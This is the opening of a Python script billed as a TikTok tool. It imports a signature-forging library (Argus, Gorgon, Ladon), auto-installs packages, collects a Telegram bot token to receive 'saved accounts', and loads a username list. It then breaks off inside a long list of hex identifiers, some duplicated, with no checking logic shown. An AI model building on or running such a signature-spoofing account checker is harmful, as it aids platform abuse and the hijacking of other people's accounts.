import os,sys;import requests,time,secrets,threading,string,uuid;from random import choice,randrange,randint;from uuid import uuid4;from MedoSigner import Argus,Gorgon, md5,Ladon;from urllib.parse import urlencode;import random,re,json,SignerPy,binascii
import datetime
from concurrent.futures import ThreadPoolExecutor
from cfonts import render
try:
	import telebot 
except:
	os.system('pip install telebot')
	os.system('pip install Pytelegrambotapi==3.7.7')
	os.system('clear')
	import telebot
Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m' 
C = "\033[1;97m"
B = '\033[2;36m'
Y = '\033[1;34m'
C = "\033[1;97m"
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C = '\033[1;34m'
E = '\033[1;33m'
R = "\033[1;31m"
RR = "\033[0m"
GG = "\033[1m\033[32m"
G = '\033[1;97m'
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C1 = '\x1b[2;35m'
A = '\x1b[2;39m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
a1 = '\x1b[1;35m'  # بنفسجي
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[1;36m'  # سماوي
RED = '\x1b[1;31m'  # أحمر
ORANGE = '\x1b[38;5;208m'  # برتقالي
W = '\x1b[0m'  # ابيض
def banner():
    print(f'''{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    time.sleep(0.3)
    print(f'''{C}┃{E}   {R}TikTok Tool{C}     ┃{R}Dev: {G} @oo22bb {C} ┃{R} CH: {G} @SOFESKR{G}''')
    time.sleep(0.3)
    print(f'''{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    time.sleep(0.3)
    print(f'''{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    time.sleep(0.3)

    output = render('Server', font='block', colors=['white', 'red'], align='center', space=True)
    print('\033[1m' + output)

    time.sleep(0.3)
    print(f'''{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')

if __name__ == "__main__":
    banner()
print(f"""
	{W}[{a3}1{W}] {J21}= {a4}Saved Acounts IN Bot{J22} - {RED} حفض الحسابات في البوت
	{W}[{a3}2{W}] {J21}= {a4}Saved Acounts IN File{J22} - {RED}حفض  الحسابات في الملف
	{W}[{a3}3{W}] {J21}= {a4}All{J22} - {RED}الكل
""")
dexter = int(input(f'\t{W}[{RED}×{W}] {J21}Enter Number : '))
if dexter==1:
	idd=input(B+"	Enter ID : ")
	tok= input(B+"	Enter Token : ")
elif dexter==2:
	send=input('	Put Name File or Path : ')
elif dexter==3:
	idd=input(B+"	Enter ID : ")
	tok= input(B+"	Enter Token : ")
	send=input('	Put Name File or Path : ')
else:
		exit(f'	{RED}Incorrect choice - اختيار غير صحيح')
fileuser=input(f'	{S}Put File UserName To Be Done Check :')


with open(fileuser, "r", encoding="utf-8") as f:
    lines = f.readlines()
print(f'	{J22}Number The UserName IN List : {len(lines)}')
time.sleep(5)
ya=0
no=0
nod=0
yas=0
kn=requests.get('https://raw.githubusercontent.com/zaid21ru/text/refs/heads/main/test').text
nameee=[

'196d5ea17130e0ff10ef183f7e150238',
'69f53e6cfce263d3399991fe2a8e0739',
'66087b455831238f20ef015b1edd0b85',
'20bb70557f527eb5ebb903730c8adfdc',
'43a171f4ed796ae7aee0f2681e5d4771',
'a21b2d5219c96bcb7a00cd850fc3857b',
'551a45b941e5c50e8e3e07ce86acaee9',
'8b2dba967f78f37c3ab6a70ee71d6e56',
'2a4b553e75abf821c9276b8871808fc7',
'7b6e5208a1ad343141a17427e2aae408',
'1eb5090b6533e3f0476074fe544574b9',
'08f3374473dea81553b8368219673245',
'bcfe2f9fe7e50667c06a47a8f01de146',
'22ec5069e0378b0a07c5735924075a47',
'806a4f317a0a9642a155d81d4311f226',
'2723b41bfbc3366e3fbbd428fbe2dcd9',
'0585c6c199fa0dc0dd0259b571226855',
'6a7f1ec7cc06cc0e4cdb8e222115808a',
'5ee5d7b8db9ea6adc488a6d8922f41db',
'5a7e7c83f61e6e0e1c3ca128cd3ee79a',
'401c36fc2d0abbdda740a52838cd31c2',
'a3b91f7d92a916ce843690a99f0c43ee',
'c46f26a1aa31f443e6b73a2baab4fcb4',
'e64ed96b8c3ea51c4524b7dd25bf0abd',
'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
'31fffc2561f90d7780c034db4f458dad',
'e64ed96b8c3ea51c4524b7dd25bf0abd',
'f2a3ec8f71217f2fa2ed8507a8641920',
'6fa98a5d216b91fb49e8bd0f50b6dc29',
'3a19ad6aec83c77bf58ad20a95d87b02',
'ffea1b72a3de8ebb5c1e48c91d3886cc',
'c0ed975d7fab0b17ea77c9aac4772eda',
'62f665d8fef41027c569a264e39d1884',
'8799b7c86a83c99eb082e963e930b426',
'30ad5eb572241440c7f642ad07c3972e',
'3e815d7ed8d5ee5ed26394221cb94814',
'b521fc106d86884df7392b0d47094b42',
'70e134536c70bbd31b540bfb9abd9f16',
'a79666d0aedf81af7dec5e7302ce1a6a',
'b18a44f1169bfdcd307474ceada8090c',
'46b49a9a910464297d4a2d703cfffb60',
'9b465c4456506e57cbe2f673fe3d748f',
'333c2f1fa9ccc31d05e3433f33379f23',
'1e5aa603077be314c594aa05c85a29c7',
'226d6f0f02dd07ea3e0e3c7e1a54ee98',
'f60c544b5014358574cd7df1c1751f42',
'b054149c7a2fa4681298030e91d0c033',
'fb32c6bfd5bdef0cd0b9e5c999cf9e46',
'11fbbcffb0525d52bc394389f24a936b',
'30514372833cc1b571f8dc8a0f55db94',
'88c024610ed4bf8ceb37cc92e78b4438',
'fc1f9672a6d4177993114198414be131',
'd8f6f9558e1807a1cd083f13de997693',
'fef15837eef02f1ebd56523240dd5be0',
'5e4e1267e08331d25ed7012d84f78243',
'32df03aa0a45104c29c0eb241bfaf052',
'277641c2bd68423af3c97ee64116c9ea',
'608e50f670227682805b6c4db9008025',
'f6c32b0881229967ea0e5c90635fa19e',
'8f68c10b8a60b64e8d2dd3fcb1cdc6be',
'497a97f73536f4f24831bebfed672258',
'6f7a25ed7db6c0620d7d4b1a1779813d',
'df9f5cef1f2d05757af659235150e5a6',
'ab47913dc08abeb336556e9418449995',
'c3b41475865dd21e2a42be682cbbeec7',
'be5d43022279aae0fbb2810645e3a655',
'e1f1b7e764da963f9d0dfbc2f8c811fb',
'd0900ba89c1a62c7334db51b90d08046',
'5eccb0f11bda1f3744d306f7a1c2e4ee',
'871319a3e34f2034d5204f3e9d3fc9bc',
'800266a1b9550a662a533bbe0a51edff',
'ac8cdd63d992feda7eb1be63cd5d3cbe',
'fe087743cb83b87fe511c4dcc2b54b9e',
'28797e6bb6e3b4a2924bdd17d5ac2c9d',
'ecbce30174a3109533e8c9db2b400e9f',
'de296140fdf052974d313dffaeac39a8',
'def6f7881ea24c7c6e2f2faafd749e33',
'5cd2eb39aadf7c11bc741131fefe8352',
'e2b90094da6ff546902b52c7cbcea7bb',
'b9d8b79367847fd9dfb8647bb96edd41',
'38df69157cd19f89825ad86e40533b3e',
'eb3fa50f60dd60f3a415f4d57d5c368d',
'8a9e4778c7074dc6497bce8fbc3e7be6',
'f99638331ea251eba1dfae6ad3e331cd',
'1d5a8ad70fe1273483834fd99ba1cdee',
'531e7ed1aa699a929b313b8960677c07',
'36726a0145f85571c4d7919a564a330d',
'3e99fe2e40577af27dc4fb15f9b438f7',
'80b98f6c3b0e9eb1737f0fb96cb73e1d',
'99b2c615978200c679b321f04d314d49',
'6452b4925edad1b34284d9cf4887d281',
'475880946e2be5c2539a6c51746d2a27',
'12700e53ced122977a6705435f8dc433',
'99199284fc83817a51844b35e12b9a18',
'41dede88fec05de213462698b04ce27f',
'2c973cfb6559bc0369cefdbb75d5cbb7',
'98b6f608bcb1a1714f7d14ec97397dad',
'c33e3da3ec3b8e611625db85fb8ea360',
'dc7d2164919b5432676b4a8315d8f8b3',
'1edfd0dbb4f14549ead50fb19dc0dae3',
'771fc5bce51efef06174c5aa78fa896c',
'f2da58a0f3b534620e8ca7d070be1457',
'e0a008174fbb2f2c1923e7ca2d7ae0ba',
'160ca3c436693fcdc1165149c04d26c6',
'6b73e7069c58abfa77d72af913c75601',
'fb3ecd7a225441bcdf0f82a153976c51',
'959c67bd75dce25e3913ddbe7831013c',
'01d9a4ee761a44ab1f80d4554cc10301',
'98ac6a1ed1cea0cd7dd86da4ad548983',
'9e42fb4166611ce207b8bfcf8e76193d',
'f8448f180e37a6157b2fa6728929c858',
'300d027cc70fd71efa2dc4e1661bd053',
'28e5067ca59aefefe8a5716a4c257019',
'3c639274b33f920b4e2509382a26e737',
'114f488327fe3f9e0cb7e5d0c93e18da',
'd176247e0d0e5991755527960c9bac6e',
'f1b2fee1dd90c445fd9c91de64b3bdbb',
'd7f340e143dbb4eab73dd8f675d20b97',
'7013e9767ad43770d1a86cdd45b880e5',
'e370e7e1b0a0010360282d131c2d0613',
'63ab5a670d8d6a9fbd14f7d3fd0b30da',
'bc4d7382e95f3b9fa79d9164dac426e6',
'9b19bb4e743f4220cc05770ab88164af',
'f7a3b3d4b075b192cffd1beb30b813c7',
'a2b82c8d086aef0c1946dee0cc6214db',
'5fcdc96a5809d66bbb060307894a643e',
'959e8061d7001ae76ee67a2e9ea4f263',
'6773c0dc625db993955490cbd695999d',
'4230e681404606e3f835eb5dc2ad21de',
'834cdf818b735bcb62050f3d4e4ca6cf',
'8c3e52f39908c59ef4e9b2ca1b7878c4',
'8611ac5fe2a6c2aaba8b7a6e7928c10f',
'd0210d3fc97f97f81b85a36c084f2e10',
'6d48d9a4f32a8c616c90fea374b84f56',
'aa9d4cb3400f9bef1fb81b1a0282c533',
'4784774b438e41c63f6bbc79e3c49d0f',
'c848604685819ec5fce059f143d94793',
'8349d2cab77f8a74874f311afab0dc6b',
'47d7ee7302eaf4ad67f773747ff486fd',
'd7b6d4259088181eeccd580a9ec9e5cf',
'f9fcbcab67b85aaa162a3be1d8376808',
'0ae190135e514836ce46743aee147f83',
'b84c01904844bfc45216d073852ef9b1',
'fa2763a42b2003d21f4b0df59e09fd47',
'99103121c3a0a19a5e64c47531727f9c',
'071dea6260fa1e0d51f820eadae4accb',
'7a9620194c456a1bb59248921098ee76',
'25cc37b1ea370628f3e7a5ec751dbc37',
'd37a92233da70de1d7734a9784496e1d',
'5d4fec8d23a50b3b24958a9ed15d65f5',
'09a16299b435e99b11a2844485d8cb44',
'ff505efd41031f28a3da8de6718f2df3',
'd1561efba0f0b7c42584c0a712ba9e08',
'109d7c51cd047a8a339faf554728b4bf',
'28e163347921640fda0aa48c3a3e26e6',
'12a6ab211938a71fd78d1b3db8e5a153',
'255bbb0d976c03671ce8108cfe11b896',
'c22f32589db330c04e22d94794f423d7',
'388f27cc21e32dcfe748cd26493c9002',
'9e38d02f94634bbed9921bc094b86e47',
'eb06afe6066ea3daeef99636e47f97b9',
'c187abedab2202554f6f39f17d71e643',
'e4cb96fff89c84615b6ca65eece7b67d',
'6a64089fa0e166877f8633f7910a6341',
'96dca9e4c68c5ece6c2910763fc39007',
'2a8e162c4f0626e8bd2a7dc1483b27c3',
'e14c6616279c82b7d603d67b1b2bd0cf',
'48a1d0adf988fb326d4f1ce055c035d1',
'cf8f84b31ddb5f2606331fc75b6d10b5',
'b031795f45495345b7ed3bcee2be2e05',
'6e6ebdef9d110ea8468066a99fb35431',
'a632f2d750d448cee6638143077e4616',
'05398d4cab356ef576ac59d31e024c5b',
'd62a23f3121daaea933ab827e6a7296d',
'ee266ccac29b40c71a725b47f907bdfa',
'4d33e970315daccdfa98b0bcd289a148',
'4de29081b58fa894e2d9dae77cc8c007',
'05c9711180d7c27eca7c0350d3a21724',
'fa9ccab8a9febe630c9507dd798cf2c4',
'c305ff6eff7d6539d239fa930336f249',
'6949c01623b5e1b80c34e8f8b69427e2',
'03658898aa705236a6196c3a45a1a08c',
'a7a3e019f5acb50780d666c77da882bd',
'acd45982ed97a57232c039cdbd0361a0',
'510341fb6c3b5b93403b170f6fcfcf71',
'7ddfd72ec2f19222cf1d39d936e37464',
'8b2ac569d5067237105dc2d3a9c882dd',
'a05c9cbadfc557f88c84231e91811473',
'e26f693a49e67140f8130cf8aaf43ac8',
'4b41f36dec3ec80b06e867cc4d510da4',
'e08a945fe0f95eac0825e672e5da6399',
'aaf4396b09b2a4ae6e94e87ea355d55e',
'62c00fd6a6ebcfa01d34c5c7e9d76fee',
'2b944b383cbca03aaac4ffc480e607e3',
'32165cabd98d4961d2f4b4a3956da32e',
'21d395931e48f9e77ddd29b30e12dabe',
'b18863134f8644b046da0ef596c95948',
'3ef3e2f6770c58b0a33999646ac5da09',
'4df9ab652a37448b8f1d0c260a8b36c1',
'02a749bbec10504f4458d7408af358be',
'9e216d83dc21148e2908873c11e8dfe5',
'2d89305cb842264795438a7becae7746',
'ac9989d3dd0780057acbc431a4615aab',
'2d64fbd41353134661267af9b543d603',
'13cfd7515fd4f8e7c3fb1c2baee1d4e5',
'9d5d2ce46011f31fd5bb44db0aadeec7',
'2cd4f11db806bcfdbcc080287a6a24ce',
'a0262d0d3c387d058425f772ef2aaddc',
'd0d4651a4b9d7de6021f5aeb39c18cb3',
'72f145dc8a75e265ee9e54ad48d03acf',
'02940f5f24ce2b3dc2979385fc0a0e4f',
'1747d761d4186b49720c4553bf8e429b',
'fc91720d1e5722dea724f96cbe7be48b',
'90f2f7e5b184e93538b7b07aee552a7a',
'ce87e30cd6ecdd4946b6521dc6f7f28e',
'7b71295b2b7ece941b563d9f5a13c5d9',
'cd8bd19192cc165634eb9b625fa51197',
'1750338f93bf15532b7875c2fc7e5edf',
'26af96223c9534a1fbcb6ace2669ee03',
'1c3d0dce7e09dc846b195436a6feca5c',
'1883abaa2abb68dfaa5385ffd8fb1210',
'd078ec8a3d4d76336f7f5ef102a93960',
'b9a7d4a3fe37320114a8616374025c27',
'3fd8fc9ecff1fd02eb2188917cf9305c',
'c6e7f8edb527733c6c83ec353d8e39d7',
'4a502defc0a2b58eb571146bbf9f9d88',
'38c1662a5a6f7d61b36a28c2a64c3a5c',
'e60f73fa0e6c40d7b7ff7e6cbf84d3a3',
'dbcc9b8c283f410c6358bc23c24a5f3e',
'336a32fd882ea7a9a209f5f6f1001aec', 'fe087743cb83b87fe511c4dcc2b54b9e', '0a0fef60a9c37390453fd0a2f5eae084', 'c5913e6c105f88b19e4a6da96225b0a5', '686a259b53d792a96eb099e6326536f3', 'd2906ee6e5024de40be103e937e66bb1', '5e1078840499161441c8a8ca40295fb1', '46bfa28933895ace05a96a0ba0608476', '2b5abd2c94b5e57fa57d2d792fcd958b', '78cd438e41a1be9f27434a7ecb45d1f6', 'befcea68deff3c0877b5f632281d0e5c', '28797e6bb6e3b4a2924bdd17d5ac2c9d', 'ecbce30174a3109533e8c9db2b400e9f', 'de296140fdf052974d313dffaeac39a8', '9fddad156790a04d6dc9f6e150d7cc5e', '10b30da78a13e426e7c2f2019195fb07', '6805b2b6487750f8a9ed74661eca0a18', 'def6f7881ea24c7c6e2f2faafd749e33', '5d46a008e884feab7008d237231e7c2a', '611254e09febca06d81e7f4ee9acf739', '994be4fc2df6c999579844375cc4eb05', 'a452e90fde70ea9e9083d06ad000d69b', '86fd5bd98326e1478e6eec4aeb581640', '5cd2eb39aadf7c11bc741131fefe8352', 'd81b5f29f47c0f621848a5bed9906205', 'ad597479d1c78c6d7c07135b98883ec7', 'e2b90094da6ff546902b52c7cbcea7bb', 'b9d8b79367847fd9dfb8647bb96edd41', '38df69157cd19f89825ad86e40533b3e', 'eb3fa50f60dd60f3a415f4d57d5c368d', 'e3f82adbd81c7e3fb02160526497f0d5', '8a9e4778c7074dc6497bce8fbc3e7be6', '6fcad57feb38a57155455fadf8fb8caa', '7872475d47b25e925845cb90e42e4c31', 'dc38c5c297ad483b59e13181b21cc0e8', '78f01b752b0e291c4177e2319871e5cd', 'f99638331ea251eba1dfae6ad3e331cd', 'c79eddc5e5f2f71fee0ab13cc7095483', '9bb881516b14276d1506c5b13201a641', '1d5a8ad70fe1273483834fd99ba1cdee', '531e7ed1aa699a929b313b8960677c07', 'a3b5391061c14c5bea994a67ecba701a', '8b8e6c66621495028a8736288d4b9f60', '36726a0145f85571c4d7919a564a330d', '3572063b01656d663061a7ed0888dd30', '3e99fe2e40577af27dc4fb15f9b438f7', 'c075d398cbf3a2b2c07684df36984341', '80b98f6c3b0e9eb1737f0fb96cb73e1d', '51ccd10042f16e1768008a7e7de06abc', '99b2c615978200c679b321f04d314d49', 'e6be1a32ae14b07e95a33d79e907ab75', '6452b4925edad1b34284d9cf4887d281', '85bae7724ff412e6416add3975d7578f', '8a127cc4be5a9cfa63e6c6f67219a490', 'e7517be667bf0081e88403632e3c94d6', '475880946e2be5c2539a6c51746d2a27', '12700e53ced122977a6705435f8dc433', '99199284fc83817a51844b35e12b9a18', '41dede88fec05de213462698b04ce27f', '2c973cfb6559bc0369cefdbb75d5cbb7', 'c6a4f0c449e315424289978d8e3f05f7', '1701c221c9719dcc25ebe117759c06b3', '98b6f608bcb1a1714f7d14ec97397dad', '14cc3c5d685cd6f93fc178d8f2c2632f', 'c33e3da3ec3b8e611625db85fb8ea360', 'd68ba7cadc2ee0459db73a3552e734da', '70ef7ff3f4a3b26f833fbcbd1c03051f', '27ea1b3c8a253ea83a2fe37dc284e68e', '7de5eee54214f4193593f8f3135082b2', 'cd0f53b4792b963e9d0a2330d2bba74b', '23126441f9d70e4b3a09d6b02b88f4db', 'dc7d2164919b5432676b4a8315d8f8b3', 'f98471c9220848e8fa3ad8ea31c86225', '3da3384851b7b0d98d23ef5c9b363efc', '1edfd0dbb4f14549ead50fb19dc0dae3', '440aa49c72a868f991c4ab05226d3250', 'b848e09658da067adc08221282fe8cce', '54377e9fe52cdffec1cf9f94d961dbf0', '5706974cb7a333f2aa6344182fa9e24c', '3886d9870710210bbae36ea174116b46', '3d034db5510fb4577acea1bb7853285f', '771fc5bce51efef06174c5aa78fa896c', '31a3dcfa596e1b8904e7eb3234154f12', 'a2f9f142f0a65082b5b288ca674ab068', 'd47c091970b7ebe7eceb45f6db5bf377', '8d40480a584859232cf9db44895307c8', '77e24da2dd86794d0233b45f9122dd6a', 'f2da58a0f3b534620e8ca7d070be1457', 'e0a008174fbb2f2c1923e7ca2d7ae0ba', '711326a9ce06c555903b43e5d0a8f64e', '160ca3c436693fcdc1165149c04d26c6', 'db5aed4cc13b8c33d4a409948ba8b677', '6b73e7069c58abfa77d72af913c75601', 'b8f86957a52616badf8897c94c3705d6', 'fb3ecd7a225441bcdf0f82a153976c51', '959c67bd75dce25e3913ddbe7831013c', '563c76e23b0f1c8fb34fc4b2016192a2', '01d9a4ee761a44ab1f80d4554cc10301', '0ec7f88b7fa70feb1badea37cc5748d6', '94fa96e1fc5ed700901c37a2a03966c0', 'ea8303df864b6fbe25a73fc6c02fe4e9', '98ac6a1ed1cea0cd7dd86da4ad548983', '9e42fb4166611ce207b8bfcf8e76193d', 'f8448f180e37a6157b2fa6728929c858', '300d027cc70fd71efa2dc4e1661bd053', '28e5067ca59aefefe8a5716a4c257019', '3a3ad8e66b4a328280aeb8def7e4526c', '7a35f4c1fe2909ee619f881438757502', 'cfd0cea0924da90ef2d7e413f4d1b618', '3c639274b33f920b4e2509382a26e737', '62ce3b7afc11cc60503d57c50d46eb4a', '5fdd7957547d882ca1e3c5b3d33420e1', '13de4a9b03153f3d415746951871cab1', '114f488327fe3f9e0cb7e5d0c93e18da', '759fca154d2a4e1f801842e3a79f6766', '0b6ad9305fbea569f7c5d4b9d17cbdc9', 'd176247e0d0e5991755527960c9bac6e', 'f1b2fee1dd90c445fd9c91de64b3bdbb', '7b7230e76e67e6d467aa6c6e33694b23', 'd7f340e143dbb4eab73dd8f675d20b97', '7013e9767ad43770d1a86cdd45b880e5', '4505ccb48f0a6a2541e34caaefac8840', 'e56d4e0c3f4034f9d6aada115759169c', 'c33a0ef15486debe17f4a38fc4bcb1b0', 'cc961ebfa09ba689786484f07b9b932c', 'f80b8abf5291f2d958ca9bbc8285eb8a', 'e370e7e1b0a0010360282d131c2d0613', '63ab5a670d8d6a9fbd14f7d3fd0b30da', 'f699c60e0671ac8cf07b47b98876e750', '8c77d0106c0249ad50fdccdcea3ab888', '7c67d00d73751c447972067da77b9c08', 'ba0cb1b483e91b176e0a9e8991d24d29', 'bc4d7382e95f3b9fa79d9164dac426e6', '2675c0445217ed43acaa90e9835d3801', '6f968388b83d7ff2e19659c527b1ad08'            '196d5ea17130e0ff10ef183f7e150238',
	'69f53e6cfce263d3399991fe2a8e0739',
	'66087b455831238f20ef015b1edd0b85',
	'20bb70557f527eb5ebb903730c8adfdc',
	'43a171f4ed796ae7aee0f2681e5d4771',
	'a21b2d5219c96bcb7a00cd850fc3857b',
	'551a45b941e5c50e8e3e07ce86acaee9',
	'8b2dba967f78f37c3ab6a70ee71d6e56',
	'2a4b553e75abf821c9276b8871808fc7',
	'7b6e5208a1ad343141a17427e2aae408',
	'1eb5090b6533e3f0476074fe544574b9',
	'08f3374473dea81553b8368219673245',
	'bcfe2f9fe7e50667c06a47a8f01de146',
	'22ec5069e0378b0a07c5735924075a47',
	'806a4f317a0a9642a155d81d4311f226',
	'2723b41bfbc3366e3fbbd428fbe2dcd9',
	'0585c6c199fa0dc0dd0259b571226855',
	'6a7f1ec7cc06cc0e4cdb8e222115808a',
	'5ee5d7b8db9ea6adc488a6d8922f41db',
	'5a7e7c83f61e6e0e1c3ca128cd3ee79a',
	'401c36fc2d0abbdda740a52838cd31c2',
	'a3b91f7d92a916ce843690a99f0c43ee',
	'c46f26a1aa31f443e6b73a2baab4fcb4',
	'e64ed96b8c3ea51c4524b7dd25bf0abd',
	'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
	'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
	'31fffc2561f90d7780c034db4f458dad',
	'e64ed96b8c3ea51c4524b7dd25bf0abd',
	'f2a3ec8f71217f2fa2ed8507a8641920',
	'6fa98a5d216b91fb49e8bd0f50b6dc29',
	'3a19ad6aec83c77bf58ad20a95d87b02',
	'ffea1b72a3de8ebb5c1e48c91d3886cc',
	'c0ed975d7fab0b17ea77c9aac4772eda',
	'62f665d8fef41027c569a264e39d1884',
	'8799b7c86a83c99eb082e963e930b426',
	'30ad5eb572241440c7f642ad07c3972e',
	'3e815d7ed8d5ee5ed26394221cb94814',
	'b521fc106d86884df7392b0d47094b42',
	'70e134536c70bbd31b540bfb9abd9f16',
	'a79666d0aedf81af7dec5e7302ce1a6a',
	'b18a44f1169bfdcd307474ceada8090c',
	'46b49a9a910464297d4a2d703cfffb60',
	'9b465c4456506e57cbe2f673fe3d748f',
	'333c2f1fa9ccc31d05e3433f33379f23',
	'1e5aa603077be314c594aa05c85a29c7',
	'226d6f0f02dd07ea3e0e3c7e1a54ee98',
	'f60c544b5014358574cd7df1c1751f42',
	'b054149c7a2fa4681298030e91d0c033',
	'fb32c6bfd5bdef0cd0b9e5c999cf9e46',
	'11fbbcffb0525d52bc394389f24a936b',
	'30514372833cc1b571f8dc8a0f55db94',
	'88c024610ed4bf8ceb37cc92e78b4438',
	'fc1f9672a6d4177993114198414be131',
	'd8f6f9558e1807a1cd083f13de997693',
	'fef15837eef02f1ebd56523240dd5be0',
	'5e4e1267e08331d25ed7012d84f78243',
	'32df03aa0a45104c29c0eb241bfaf052',
	'277641c2bd68423af3c97ee64116c9ea',
	'608e50f670227682805b6c4db9008025',
	'f6c32b0881229967ea0e5c90635fa19e',
	'8f68c10b8a60b64e8d2dd3fcb1cdc6be',
	'497a97f73536f4f24831bebfed672258',
	'6f7a25ed7db6c0620d7d4b1a1779813d',
	'df9f5cef1f2d05757af659235150e5a6',
	'ab47913dc08abeb336556e9418449995',
	'c3b41475865dd21e2a42be682cbbeec7',
	'be5d43022279aae0fbb2810645e3a655',
	'e1f1b7e764da963f9d0dfbc2f8c811fb',
	'd0900ba89c1a62c7334db51b90d08046',
	'5eccb0f11bda1f3744d306f7a1c2e4ee',
	'871319a3e34f2034d5204f3e9d3fc9bc',
	'800266a1b9550a662a533bbe0a51edff',
	'ac8cdd63d992feda7eb1be63cd5d3cbe',
	'fe087743cb83b87fe511c4dcc2b54b9e',
	'28797e6bb6e3b4a2924bdd17d5ac2c9d',
	'ecbce30174a3109533e8c9db2b400e9f',
	'de296140fdf052974d313dffaeac39a8',
	'def6f7881ea24c7c6e2f2faafd749e33',
	'5cd2eb39aadf7c11bc741131fefe8352',
	'e2b90094da6ff546902b52c7cbcea7bb',
	'b9d8b79367847fd9dfb8647bb96edd41',
	'38df69157cd19f89825ad86e40533b3e',
	'eb3fa50f60dd60f3a415f4d57d5c368d',
	'8a9e4778c7074dc6497bce8fbc3e7be6',
	'f99638331ea251eba1dfae6ad3e331cd',
	'1d5a8ad70fe1273483834fd99ba1cdee',
	'531e7ed1aa699a929b313b8960677c07',
	'36726a0145f85571c4d7919a564a330d',
	'3e99fe2e40577af27dc4fb15f9b438f7',
	'80b98f6c3b0e9eb1737f0fb96cb73e1d',
	'99b2c615978200c679b321f04d314d49',
	'6452b4925edad1b34284d9cf4887d281',
	'475880946e2be5c2539a6c51746d2a27',
	'12700e53ced122977a6705435f8dc433',
	'99199284fc83817a51844b35e12b9a18',
	'41dede88fec05de213462698b04ce27f',
	'2c973cfb6559bc0369cefdbb75d5cbb7',
	'98b6f608bcb1a1714f7d14ec97397dad',
	'c33e3da3ec3b8e611625db85fb8ea360',
	'dc7d2164919b5432676b4a8315d8f8b3',
	'1edfd0dbb4f14549ead50fb19dc0dae3',
	'771fc5bce51efef06174c5aa78fa896c',
	'f2da58a0f3b534620e8ca7d070be1457',
	'e0a008174fbb2f2c1923e7ca2d7ae0ba',
	'160ca3c436693fcdc1165149c04d26c6',
	'6b73e7069c58abfa77d72af913c75601',
	'fb3ecd7a225441bcdf0f82a153976c51',
	'959c67bd75dce25e3913ddbe7831013c',
	'01d9a4ee761a44ab1f80d4554cc10301',
	'98ac6a1ed1cea0cd7dd86da4ad548983',
	'9e42fb4166611ce207b8bfcf8e76193d',
	'f8448f180e37a6157b2fa6728929c858',
	'300d027cc70fd71efa2dc4e1661bd053',
	'28e5067ca59aefefe8a5716a4c257019',
	'3c639274b33f920b4e2509382a26e737',
	'114f488327fe3f9e0cb7e5d0c93e18da',
	'd176247e0d0e5991755527960c9bac6e',
	'f1b2fee1dd90c445fd9c91de64b3bdbb',
	'd7f340e143dbb4eab73dd8f675d20b97',
	'7013e9767ad43770d1a86cdd45b880e5',
	'e370e7e1b0a0010360282d131c2d0613',
	'63ab5a670d8d6a9fbd14f7d3fd0b30da',
	'bc4d7382e95f3b9fa79d9164dac426e6',
	'9b19bb4e743f4220cc05770ab88164af',
	'f7a3b3d4b075b192cffd1beb30b813c7',
	'a2b82c8d086aef0c1946dee0cc6214db',
	'5fcdc96a5809d66bbb060307894a643e',
	'959e8061d7001ae76ee67a2e9ea4f263',
	'6773c0dc625db993955490cbd695999d',
	'4230e681404606e3f835eb5dc2ad21de',
	'834cdf818b735bcb62050f3d4e4ca6cf',
	'8c3e52f39908c59ef4e9b2ca1b7878c4',
	'8611ac5fe2a6c2aaba8b7a6e7928c10f',
	'd0210d3fc97f97f81b85a36c084f2e10',
	'6d48d9a4f32a8c616c90fea374b84f56',
	'aa9d4cb3400f9bef1fb81b1a0282c533',
	'4784774b438e41c63f6bbc79e3c49d0f',
	'c848604685819ec5fce059f143d94793',
	'8349d2cab77f8a74874f311afab0dc6b',
	'47d7ee7302eaf4ad67f773747ff486fd',
	'd7b6d4259088181eeccd580a9ec9e5cf',
	'f9fcbcab67b85aaa162a3be1d8376808',
	'0ae190135e514836ce46743aee147f83',
	'b84c01904844bfc45216d073852ef9b1',
	'fa2763a42b2003d21f4b0df59e09fd47',
	'99103121c3a0a19a5e64c47531727f9c',
	'071dea6260fa1e0d51f820eadae4accb',
	'7a9620194c456a1bb59248921098ee76',
	'25cc37b1ea370628f3e7a5ec751dbc37',
	'd37a92233da70de1d7734a9784496e1d',
	'5d4fec8d23a50b3b24958a9ed15d65f5',
	'09a16299b435e99b11a2844485d8cb44',
	'ff505efd41031f28a3da8de6718f2df3',
	'd1561efba0f0b7c42584c0a712ba9e08',
	'109d7c51cd047a8a339faf554728b4bf',
	'28e163347921640fda0aa48c3a3e26e6',
	'12a6ab211938a71fd78d1b3db8e5a153',
	'255bbb0d976c03671ce8108cfe11b896',
	'c22f32589db330c04e22d94794f423d7',
	'388f27cc21e32dcfe748cd26493c9002',
	'9e38d02f94634bbed9921bc094b86e47',
	'eb06afe6066ea3daeef99636e47f97b9',
	'c187abedab2202554f6f39f17d71e643',
	'e4cb96fff89c84615b6ca65eece7b67d',
	'6a64089fa0e166877f8633f7910a6341',
	'96dca9e4c68c5ece6c2910763fc39007',
	'2a8e162c4f0626e8bd2a7dc1483b27c3',
	'e14c6616279c82b7d603d67b1b2bd0cf',
